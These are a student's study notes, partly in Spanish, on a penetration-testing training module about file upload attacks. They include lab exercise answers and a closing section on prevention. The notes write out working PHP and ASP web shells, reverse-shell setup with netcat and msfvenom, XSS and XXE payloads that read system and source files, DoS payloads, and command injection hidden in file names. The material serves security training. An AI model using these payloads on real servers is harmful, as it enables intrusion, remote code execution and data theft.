# Intro to File Upload Attacks

Uploading user files has become a key feature for most modern web applications, enabling the extensibility of these applications with user-provided information. For instance:

- A social media website allows the upload of user profile images and other media.
- A corporate website may allow users to upload PDFs and other documents for corporate use.

However, enabling this feature introduces risks, as end-users can store potentially malicious data on the web application's back-end server. Without proper filtering and validation, attackers might exploit the file upload feature to execute arbitrary commands on the server and potentially take control of it.

File upload vulnerabilities are among the most common in web and mobile applications, as evidenced by the latest CVE reports. Many of these vulnerabilities are rated as **High** or **Critical**, underscoring the serious risks posed by insecure file uploads.

---

## Types of File Upload Attacks

### Weak File Validation and Verification

The primary cause of file upload vulnerabilities is weak or missing file validation and verification. The most severe form of this vulnerability is an **unauthenticated arbitrary file upload**, which allows any unauthenticated user to:

- Upload any file type.
- Execute code on the back-end server.

### Common Attacks

Even with file validation in place, insecure filters can often be bypassed, leading to vulnerabilities such as:

1. **Remote Command Execution**
   - Uploading a web shell: This allows the attacker to execute arbitrary commands and potentially gain an interactive shell to further exploit the network.
   - Uploading a script that sends a reverse shell: This enables interaction with the remote server via a listener on the attacker's machine.

2. **File-Type-Specific Attacks**
   - Exploiting the ability to upload specific file types when certain protections are missing.

### Other Potential Exploits

- **XSS or XXE Injection**: Introducing additional vulnerabilities through the uploaded files.
- **Denial of Service (DoS)**: Overloading the back-end server.
- **Overwriting System Files**: Altering critical system configurations.

### Use of Outdated Libraries

Vulnerabilities may also stem from outdated libraries used in the web application, which can expose the application to file upload attacks.

---

## Mitigating File Upload Vulnerabilities

At the end of this module, we will explore various tips and practices to secure web applications against common file upload attacks. Recommendations will include:

- Strong file validation and verification techniques.
- Regular updates to libraries and frameworks.
- Additional best practices to prevent file upload vulnerabilities.

By implementing these measures, developers can significantly reduce the risk posed by insecure file uploads.

---

# Absent Validation

The most basic type of file upload vulnerability occurs when the web application does not have any form of validation filters on the uploaded files, allowing the upload of any file type by default.

With these types of vulnerable web apps, we may directly upload our web shell or reverse shell script to the web application, and then by just visiting the uploaded script, we can interact with our web shell or send the reverse shell.

---

## Arbitrary File Upload

### Example Scenario

Let’s start the exercise at the end of this section, where we encounter an Employee File Manager web application that allows users to upload personal files:

- **URL:** `http://SERVER_IP:PORT/`

The application does not specify allowed file types, and we can drag and drop any file, including `.php` files, which appear on the upload form. The file selector dialog also states "All Files" as the file type, suggesting no restrictions are applied.

This lack of restrictions indicates the potential to upload arbitrary file types, which could allow us to exploit the back-end server.

### Identifying Web Framework

To test the ability to upload any file type and exploit the back-end server, we first identify the programming language used by the web application. 

#### Steps to Identify
1. **URL Inspection:**
   - Check the page extension in URLs (e.g., `.php`, `.asp`, `.aspx`).
   - Example: Visit `http://SERVER_IP:PORT/index.php` to check if it’s a PHP application.

2. **Tools for Identification:**
   - Use tools like **Burp Intruder** with a Web Extensions wordlist for fuzzing file extensions.
   - Browser extensions like **Wappalyzer** to identify technologies in use.

3. **Alternative Methods:**
   - Run web scanners like **Burp/ZAP** or other Web Vulnerability Assessment tools.

#### Example Outcome
Using Wappalyzer or similar tools, we identify the web application runs on PHP and learn about the web server type, version, and back-end OS. Once identified, we prepare a malicious script written in PHP to exploit the application.

### Vulnerability Identification

After identifying the web framework, we test whether arbitrary files can be uploaded:

1. Create a test PHP file `test.php` with the content:
   ```php
   <?php echo "Hello HTB";?>
   ```

2. Upload `test.php` to the web application:
   - **URL:** `http://SERVER_IP:PORT/`
   - Confirm success: A message like "File successfully uploaded" appears.

3. Access the uploaded file:
   - **URL:** `http://SERVER_IP:PORT/uploads/test.php`
   - Outcome: The page displays `Hello HTB`, indicating successful execution of PHP code.

If the application were unable to execute PHP code, the source code would have been displayed instead.

---

In the next section, we will explore how to leverage this vulnerability to execute code on the back-end server and gain control over it.

Ejercicio1
  Try to upload a PHP script that executes the (hostname) command on the back-end server, and submit the first word of it as the answer.
    ```<?php
      system("hostname");
    ?>```
    hacerlo en un .php subirlo y descargarlo

---

# Upload Exploitation

The final step in exploiting a vulnerable web application is uploading a malicious script written in the same language as the web application, such as a web shell or reverse shell script. Once the malicious script is uploaded, visiting its link allows interaction to gain control over the back-end server.

---

## Web Shells

Web shells provide features like directory traversal and file transfer. Examples include:

- **PHPBash**: A terminal-like semi-interactive web shell for PHP.
- **SecLists**: Contains various web shells for different frameworks and languages, found in the `/opt/useful/seclists/Web-Shells` directory on PwnBox.

### Uploading a Web Shell
1. Download a web shell for the language of the web application (e.g., `phpbash.php` for PHP).
2. Upload the web shell through the vulnerable upload feature.
3. Visit the uploaded file link (e.g., `http://SERVER_IP:PORT/uploads/phpbash.php`).

The web shell provides a terminal-like interface, simplifying enumeration and exploitation of the back-end server. Test other web shells from SecLists to find the most suitable one for your needs.

### Writing a Custom Web Shell
In cases where online tools are unavailable, writing a simple custom web shell is useful. For PHP:

```php
<?php system($_REQUEST['cmd']); ?>
```

- Save this script as `shell.php`.
- Upload it to the web application.
- Execute system commands using the `?cmd=` GET parameter (e.g., `http://SERVER_IP:PORT/uploads/shell.php?cmd=id`).

**Tip:** Use source-view mode (`CTRL+U`) in the browser to display command output in a terminal-like format without HTML rendering.

Other languages/frameworks can use similar techniques with their respective functions. For example, .NET web applications:

```asp
<% eval request('cmd') %>
```

Note: Web shells may fail due to security measures like firewalls or disabled server functions.

---

## Reverse Shells

Reverse shells offer an interactive method for controlling compromised servers. For PHP:

### Using Pre-Existing Scripts
1. Download a reverse shell script (e.g., the pentestmonkey PHP reverse shell from SecLists).
2. Edit the script to set your IP and listening port:

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

3. Start a netcat listener on your machine:

```bash
nc -lvnp OUR_PORT
```

4. Upload the script to the web application.
5. Visit its link to execute the script and establish a connection:

```bash
connect to [OUR_IP] from (UNKNOWN) [BACKEND_IP] PORT
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Generating Custom Reverse Shell Scripts
Use tools like `msfvenom` to create reverse shell scripts:

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

1. Start a netcat listener on the specified port.
2. Upload `reverse.php` and visit its link to establish the connection.

Reverse shell payloads can be generated for various languages by changing the `-p` and `-f` flags.

---

While reverse shells provide the most interactive control, they may fail due to firewalls or disabled server functions, making web shells a fallback option. Understanding both methods is critical for effective web exploitation.


Ejercicio2
  Try to exploit the upload feature to upload a web shell and get the content of /flag.txt
    ```<?php
          if (isset($_GET['cmd'])) {
            echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
          }
        ?>
        ```
        luego en la url hacer ?cmd= cat /flag.txt

---

## Client-Side Validation

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.

### Back-end Request Modification

1. Capture a normal request through Burp after selecting an image for upload.
2. Observe the standard HTTP request sent to the back-end (e.g., `/upload.php`).
3. Modify the `filename` and file content:
   - Change `filename="HTB.png"` to `filename="shell.php"`.
   - Replace the file content with your web shell content.
4. Send the modified request to the server.
5. Verify upload success and visit the uploaded file link to interact with your web shell.

### Disabling Front-end Validation

1. Open the browser's Page Inspector (`CTRL+SHIFT+C`) and locate the file input element.
2. Modify or remove client-side validation scripts:
   - Remove the `checkFile` function from the `onchange` attribute.
   - Optionally remove `accept=".jpg,.jpeg,.png"` to allow file selection without restrictions.
3. Save changes and use the upload functionality to upload your web shell.

**Note:** Changes made to the front-end are temporary and will not persist through page refreshes.

Once uploaded, use the Page Inspector to find the URL of the uploaded web shell, and visit it to execute commands on the back-end server:

```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

Visit the link (e.g., `http://SERVER_IP:PORT/profile_images/shell.php?cmd=id`) to interact with the uploaded shell.

---

While reverse shells are always preferred over web shells for interactive control, understanding client-side validation bypass techniques is crucial for web exploitation scenarios.

Ejercicio3
  Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice)
    Es sencillo, abrir burpsuite y con el codigo anterior hacerlo a .png y lkuego tras interceptarlo con burpsuite solo deberas ponerlo en .php y mandarlo y asi podras ejecutar codigo como el anterior'

---

# Blacklist Filters

In the previous section, we saw an example of a web application that only applied type validation controls on the front-end (i.e., client-side), which made it trivial to bypass these controls. This is why it is always recommended to implement all security-related controls on the back-end server, where attackers cannot directly manipulate it.

Still, if the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.

## Blacklisting Extensions

The exercise we find in this section is similar to the one we saw in the previous section, but it has a blacklist of disallowed extensions to prevent uploading web scripts. We will see why using a blacklist of common extensions may not be enough to prevent arbitrary file uploads and discuss several methods to bypass it.

### Example Code
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

### Observations:
- **Weakness:** The blacklist is not comprehensive. Many extensions can still be used to execute PHP code.
- **Case-Sensitivity:** The comparison is case-sensitive, so mixed-case extensions like `pHp` might bypass the blacklist.

### Exploitation
1. **Fuzzing Extensions:**
   - Use tools like Burp Suite to fuzz the upload functionality with lists of potential extensions.
   - Tools and lists:
     - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
     - [SecLists](https://github.com/danielmiessler/SecLists)
   
2. **Steps:**
   - Intercept the request in Burp.
   - Replace the filename extension with a fuzzing payload.
   - Use Intruder to test for non-blacklisted extensions.
   - Analyze the results by sorting responses based on length or status messages.

3. **Identify Non-Blacklisted Extensions:**
   - Extensions not blocked by the blacklist may allow code execution.
   - Common example: `.phtml`

4. **Upload and Execute PHP Shell:**
   - Modify the filename to use an allowed extension (e.g., `shell.phtml`).
   - Update the file content to include a PHP shell.
   - Verify the file upload directory (e.g., `/profile_images`).
   - Access the uploaded file and execute commands to confirm the bypass.

### Key Learnings:
- Blacklists are inherently limited and prone to bypass.
- Whitelisting extensions and performing server-side content validation is a more robust approach.
- Always test file uploads thoroughly for potential vulnerabilities.

### Tools and Resources:
- Burp Suite
- PayloadsAllTheThings
- SecLists


Ejercicio4
  Try to find an extension that is not blacklisted and can execute PHP code on the web server, and use it to read "/flag.txt"
    Usarlo si o si con burpsuit para que funcionen los comandos --> https://github.com/artyuum/simple-php-web-shell

---

# Whitelist Filters

## Overview
The other type of file extension validation is by utilizing a whitelist of allowed file extensions. A whitelist is generally more secure than a blacklist. The web server would only allow the specified extensions, and the list would not need to be comprehensive in covering uncommon extensions.

Different use cases apply for a blacklist and a whitelist:
- **Blacklist**: Useful where the upload functionality allows a wide variety of file types (e.g., File Manager).
- **Whitelist**: Suitable for upload functionalities permitting only a few file types.

Both methods can also be used in tandem.

## Whitelisting Extensions

### Exercise
Attempt to upload an uncommon PHP extension (e.g., `.phtml`) and observe the response. For example:

```
http://SERVER_IP:PORT/
```

If a message like "Only images are allowed" is displayed, the validation method may involve a whitelist. However, error messages might not always reflect the validation method. Use a wordlist for fuzzing as done previously to identify allowed extensions.

### Observations
- Variations of PHP extensions (e.g., `php5`, `php7`, `phtml`) may be blocked.
- Other malicious extensions might bypass and upload successfully. Investigate how these extensions bypass restrictions and determine if they enable PHP code execution.

### Example Validation Code
```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**Issue:** The regex checks for extensions in the filename but not whether it ends with them, making it vulnerable to bypassing techniques like **Double Extensions**.

### Double Extensions
Adding a whitelisted extension (e.g., `.jpg`) before a malicious extension (e.g., `.php`) can bypass validation. For instance:

- File: `shell.jpg.php`

The whitelist test passes due to `.jpg`, allowing the upload of a PHP script.

#### Exercise
Intercept a normal upload request and modify the file name to:

- `shell.jpg.php`

Modify the content to include a web shell and upload it. Access the uploaded file:

```
http://SERVER_IP:PORT/profile_images/shell.jpg.php?cmd=id
```

If successful, commands execute on the back-end server.

### Strict Regex Validation
Some applications use stricter patterns:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

Here, the `$` ensures the filename ends with a valid extension, preventing Double Extensions. Exploiting such configurations often relies on outdated systems or misconfigurations.

### Reverse Double Extension
Even with strict validation, server misconfigurations can lead to vulnerabilities. For example:

Apache2 configuration (`/etc/apache2/mods-enabled/php7.4.conf`):
```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

If the regex does not end with `$`, filenames like `shell.php.jpg` pass validation but execute PHP code on upload due to the server configuration.

#### Exercise
Test filenames like:

- `shell.php.jpg`

Access the uploaded file:

```
http://SERVER_IP:PORT/profile_images/shell.php.jpg?cmd=id
```

### Character Injection
Injecting specific characters can trick the server into misinterpreting the file extension. Examples:

- `%20`, `%0a`, `%00`, `%0d0a`
- `/`, `.\`, `.`, `…`, `:`

For example:

- `shell.php%00.jpg`

In older PHP servers (5.X or earlier), this stores the file as `shell.php` while passing validation.

#### Bash Script for Permutations
Generate permutations with a script:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

#### Exercise
Add more PHP extensions to the script and fuzz the upload functionality. Identify which filenames pass validation and execute PHP code.


Ejercicio5
   The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"
      Es facil index.phar.jpg

---

# Type Filters

## Overview
File upload validation often includes checking file extensions, but this alone is insufficient to prevent attacks. Testing the file content ensures it matches the specified type, providing additional security. Two common methods for validating file content are **Content-Type Header** and **MIME-Type**.

---

## Content-Type Validation
The Content-Type header indicates the file type during upload, usually derived from the file extension. This validation can be bypassed by manipulating the Content-Type header.

### Example Validation Code
```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

### Bypassing Content-Type Validation
1. **Fuzz the Content-Type Header**: Use a wordlist (e.g., SecLists' Content-Type Wordlist) to identify allowed types.
   ```bash
   wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
   cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
   ```
2. Intercept the upload request and modify the file's Content-Type header to an allowed type (e.g., `image/jpg`).

### Example
- Upload the file and intercept the request.
- Change the Content-Type header.
- Verify upload success:
  ```
  http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
  ```

---

## MIME-Type Validation
MIME-Type determines the file type based on its content structure. Web servers inspect the file's **magic bytes** to classify the type.

### Example Validation Code
```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

### Manipulating MIME-Type
To bypass MIME-Type validation:
1. Modify the file's magic bytes to match an allowed type (e.g., `GIF8` for GIF images).
   ```bash
   echo "GIF8" > file.jpg
   file file.jpg
   ```
2. Upload the modified file while keeping the malicious payload.

### Example
- Add `GIF8` to the beginning of the file:
  ```
  echo "GIF8" | cat - payload.php > shell.php
  ```
- Upload the file.
- Verify execution:
  ```
  http://SERVER_IP:PORT/profile_images/shell.php?cmd=id
  ```

---

## Combining Content-Type and MIME-Type Bypasses
To bypass robust filters, try combinations such as:
- Allowed MIME type with disallowed Content-Type.
- Allowed Content-Type with disallowed extension.
- Disallowed MIME/Content-Type with allowed extension.

Depending on the web server's configuration, these techniques can exploit validation weaknesses to execute malicious payloads.


Ejercicio6
   The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt"
      En este tienes que ponerlo en jpg y agregarle el GIF8 para que acepte la entrada de la imagen, sino no la agregara y no podras usar la web shell

---

# Limited File Uploads

## Overview
Even if a file upload form only allows specific file types (non-arbitrary uploads), it may still be possible to exploit vulnerabilities through allowed file types like SVG, HTML, XML, and certain image/document files. These attacks can introduce new vulnerabilities to the web application.

---

## XSS (Cross-Site Scripting)
### Exploiting HTML Uploads
HTML files can contain JavaScript code, enabling XSS or CSRF attacks when the uploaded file is accessed. For example:

```html
<script>alert('XSS');</script>
```

### Exploiting Image Metadata
Some web applications display image metadata, which can be exploited by inserting XSS payloads:

```bash
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
- Upload the modified image and verify if the metadata triggers the payload.
- Change the MIME-Type to `text/html` for additional attack vectors.

### Exploiting SVG Files
SVG images support embedded JavaScript within their XML data. Example SVG payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```
Upload this SVG file to trigger the XSS payload when the image is displayed.

---

## XXE (XML External Entity)
### Exploiting SVG with XXE
SVG files can include malicious XML data to read sensitive files. Example to read `/etc/passwd`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
- Upload the file and check if the content of `/etc/passwd` is displayed.

### Reading Source Code
Modify the XXE payload to read source files, e.g., `index.php`, in a PHP application:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
- The output will be Base64-encoded. Decode it to read the source code.

### Extending XXE
- **Other Documents**: Modify XML data in document types like PDF, Word, or PowerPoint.
- **SSRF Attacks**: Use XXE to enumerate internal services or call private APIs.

---

## DoS (Denial of Service)
### Exploiting XXE for DoS
Use an XXE payload to overwhelm the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///dev/random"> ]>
<svg>&xxe;</svg>
```

### Decompression Bombs
Upload a ZIP archive containing nested ZIP files, creating Petabytes of data:

- Example: A ZIP bomb with repeated nested files.

### Pixel Flood
Manipulate image compression data to create a massive image:

1. Create a small image (e.g., 500x500 pixels).
2. Modify its compression data to indicate an exaggerated size (e.g., `0xffff x 0xffff`, 4 Gigapixels).

### Large File Uploads
Upload a file larger than what the server can handle, potentially filling up disk space.

### Directory Traversal
Attempt to upload files to unintended directories:

```bash
../../../etc/passwd
```

---

## Exercises
1. Test XSS attacks using HTML, image metadata, and SVG.
2. Exploit XXE vulnerabilities with SVG to read sensitive files.
3. Attempt DoS attacks using decompression bombs, pixel floods, or large file uploads.

For more information, refer to the Cross-Site Scripting (XSS) and Web Attacks modules.

ejercicio7
   The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"
      Para este ejercicio hay que usar el xxe atack
      
      ```
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
         <svg>
             <text>&xxe;</text>
         </svg>
      ```
Yo he usado este codigo que escribe lo que pides por pantalla

Ejercicio8
   Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)
      Este ejercicio tendremos que suar este codigo
      
      ```
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
      <svg>&xxe;</svg>
      ```

y luego desde burpsuite deberemos decodear lo que nos sale y saldra la ruta dicha

---

# Other Upload Attacks

In addition to arbitrary file uploads and limited file upload attacks, there are a few other techniques and attacks worth mentioning, as they may become handy in some web penetration tests or bug bounty tests. Let's discuss some of these techniques and when we may use them.

## Injections in File Name

A common file upload attack uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page. 

### Examples:

1. **Command Injection**:
   - Naming a file `file$(whoami).jpg`, `file\`whoami\`.jpg`, or `file.jpg||whoami`.
   - If the web application uses an OS command to move the uploaded file (e.g., `mv file /tmp`), the `whoami` command gets executed, leading to remote code execution.

2. **XSS Payload**:
   - Using a file name like `<script>alert(window.origin);</script>`.
   - This would execute the script if the file name is displayed on the target's machine.

3. **SQL Injection**:
   - Injecting an SQL query in the file name, e.g., `file';select+sleep(5);--.jpg`.
   - This could lead to SQL injection if the file name is insecurely used in an SQL query.

## Upload Directory Disclosure

In some scenarios, the link to the uploaded file or the uploads directory may not be disclosed. Techniques to locate it include:

1. **Fuzzing**:
   - Use tools to look for common uploads directories or utilize vulnerabilities like LFI/XXE to access the application’s source code.

2. **Forcing Error Messages**:
   - Upload a file with a name that already exists.
   - Send two identical requests simultaneously.
   - Upload a file with an overly long name (e.g., 5,000 characters).

These errors may reveal the uploads directory or other helpful information.

## Windows-specific Attacks

1. **Reserved Characters**:
   - Using characters like `|`, `<`, `>`, `*`, or `?` in file names. 
   - If improperly sanitized, they may cause an error that reveals the upload directory.

2. **Reserved Names**:
   - Uploading files named `CON`, `COM1`, `LPT1`, or `NUL`, which Windows disallows.

3. **8.3 Filename Convention**:
   - Use the Tilde (`~`) character to exploit the short filename convention.
   - For example, a file named `hackthebox.txt` could be referred to as `HAC~1.TXT`.
   - This could overwrite existing files or access private ones, leading to DoS, information disclosure, or more severe exploits.

## Advanced File Upload Attacks

Advanced attacks exploit automatic processing of uploaded files, such as encoding, compressing, or renaming. 

### Examples:

- **Known Vulnerabilities**:
  - Exploiting public vulnerabilities in commonly used libraries, like the AVI upload vulnerability in `ffmpeg` leading to XXE.

- **Custom Code Exploits**:
  - Custom libraries or code may have undiscovered vulnerabilities, requiring advanced techniques to exploit them.

## Further Exploration

There are many advanced file upload vulnerabilities not covered in this module. Reviewing bug bounty reports is recommended to gain insights into these advanced techniques.

---

# Preventing File Upload Vulnerabilities

Throughout this module, we have discussed various methods of exploiting different file upload vulnerabilities. In any penetration test or bug bounty exercise we take part in, we must be able to report action points to be taken to rectify the identified vulnerabilities.

This section will discuss what we can do to ensure that our file upload functions are securely coded and safe against exploitation and what action points we can recommend for each type of file upload vulnerability.

## Extension Validation

The first and most common type of upload vulnerabilities we discussed in this module was file extension validation. File extensions play an important role in how files and scripts are executed, as most web servers and web applications tend to use file extensions to set their execution properties. This is why we should make sure that our file upload functions can securely handle extension validation.

While whitelisting extensions is always more secure, as we have seen previously, it is recommended to use both by whitelisting the allowed extensions and blacklisting dangerous extensions. This way, the blacklist list will prevent uploading malicious scripts if the whitelist is ever bypassed (e.g. shell.php.jpg). The following example shows how this can be done with a PHP web application, but the same concept can be applied to other frameworks:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.+\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

We see that with blacklisted extension, the web application checks if the extension exists anywhere within the file name, while with whitelists, the web application checks if the file name ends with the extension. Furthermore, we should also apply both back-end and front-end file validation. Even if front-end validation can be easily bypassed, it reduces the chances of users uploading unintended files, thus potentially triggering a defense mechanism and sending us a false alert.

## Content Validation

As we have also learned in this module, extension validation is not enough, as we should also validate the file content. We cannot validate one without the other and must always validate both the file extension and its content. Furthermore, we should always make sure that the file extension matches the file's content.

The following example shows us how we can validate the file extension through whitelisting, and validate both the File Signature and the HTTP Content-Type header, while ensuring both of them match our expected file type:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

## Upload Disclosure

Another thing we should avoid doing is disclosing the uploads directory or providing direct access to the uploaded file. It is always recommended to hide the uploads directory from the end-users and only allow them to download the uploaded files through a download page.

We may write a `download.php` script to fetch the requested file from the uploads directory and then download the file for the end-user. This way, the web application hides the uploads directory and prevents the user from directly accessing the uploaded file. This can significantly reduce the chances of accessing a maliciously uploaded script to execute code.

If we utilize a download page, we should make sure that the `download.php` script only grants access to files owned by the users (i.e., avoid IDOR/LFI vulnerabilities) and that the users do not have direct access to the uploads directory (i.e., 403 error). This can be achieved by utilizing the Content-Disposition and nosniff headers and using an accurate Content-Type header.

In addition to restricting the uploads directory, we should also randomize the names of the uploaded files in storage and store their "sanitized" original names in a database. When the `download.php` script needs to download a file, it fetches its original name from the database and provides it at download time for the user. This way, users will neither know the uploads directory nor the uploaded file name. We can also avoid vulnerabilities caused by injections in the file names, as we saw in the previous section.

Another thing we can do is store the uploaded files in a separate server or container. If an attacker can gain remote code execution, they would only compromise the uploads server, not the entire back-end server. Furthermore, web servers can be configured to prevent web applications from accessing files outside their restricted directories by using configurations like (`open_basedir`) in PHP.

## Further Security

The above tips should significantly reduce the chances of uploading and accessing a malicious file. We can take a few other measures to ensure that the back-end server is not compromised if any of the above measures are bypassed.

A critical configuration we can add is disabling specific functions that may be used to execute system commands through the web application. For example, to do so in PHP, we can use the `disable_functions` configuration in `php.ini` and add such dangerous functions, like `exec`, `shell_exec`, `system`, `passthru`, and a few others.

Another thing we should do is to disable showing any system or server errors, to avoid sensitive information disclosure. We should always handle errors at the web application level and print out simple errors that explain the error without disclosing any sensitive or specific details, like the file name, uploads directory, or the raw errors.

Finally, the following are a few other tips we should consider for our web applications:

- Limit file size
- Update any used libraries
- Scan uploaded files for malware or malicious strings
- Utilize a Web Application Firewall (WAF) as a secondary layer of protection

Once we perform all of the security measures discussed in this section, the web application should be relatively secure and not vulnerable to common file upload threats. When performing a web penetration test, we can use these points as a checklist and provide any missing ones to the developers to fill any remaining gaps.

---

# Skills Assessment - File Upload Attacks

You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.

Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.

## Extra Exercise

Try to note down the main security issues found with the web application and the necessary security measures to mitigate these issues and prevent further exploitation.


EjercicioFinal
   Try to exploit the upload form to read the flag found at the root directory "/".
      Primero hay que sacar de uplaod.php todo lo necesario para saber que esta prohibido y que no
      
